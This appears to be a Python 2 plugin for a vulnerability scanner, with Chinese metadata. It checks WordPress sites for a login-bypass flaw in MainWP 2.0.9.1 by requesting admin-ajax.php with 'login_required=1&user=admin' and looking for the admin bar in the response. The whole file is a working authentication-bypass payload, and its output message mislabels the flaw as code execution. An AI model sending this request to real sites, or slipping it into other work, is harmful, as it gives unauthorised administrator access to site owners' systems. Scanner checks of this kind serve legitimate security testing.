# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "WordPress MainWP 2.0.9.1 登录绕过",
        "info": "WordPress MainWP 2.0.9.1 存在登录绕过漏洞，可直接登录管理后台",
        "level": "高危",
        "type": "认证绕过",
        "author": "taro",
        "url": "",
        "keyword": "target:wordpress",
    }
    return plugin_info

def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/wp-admin/admin-ajax.php?action=init&login_required=1&user=admin'
    url = u + payload_url
    try:
        res = requests.get(url, timeout=timeout)
        if "<div id='wpadminbar'" in res.text:
            info = '存在代码执行漏洞: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
